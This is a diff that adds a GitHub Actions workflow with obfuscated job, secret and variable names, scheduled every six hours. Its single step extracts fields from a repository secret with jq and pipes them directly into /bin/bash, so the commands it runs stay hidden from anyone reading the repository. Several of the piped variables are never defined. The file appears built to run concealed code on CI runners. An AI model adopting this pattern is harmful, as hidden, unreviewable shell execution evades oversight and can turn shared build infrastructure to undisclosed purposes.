@@ -1,0 +1,22 @@
+name: congfromwochengme
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: congfromwochengme
+        env:
+          ztjj6: ${{ secrets.ztjj6 }}
+        run: |
+          echo $ztjj6 | jq -r .jkdq7 | /bin/bash
+          echo $kjzr99 | jq -r .izpw730 | /bin/bash
+          echo $mskjh1228 | jq -r .rsklm307 | /bin/bash
+          echo $buxpd21267 | jq -r .zs7313 | /bin/bash
+          echo $ju205 | jq -r .tb6 | /bin/bash
+          echo $zbini5 | jq -r .cxtn17 | /bin/bash
+
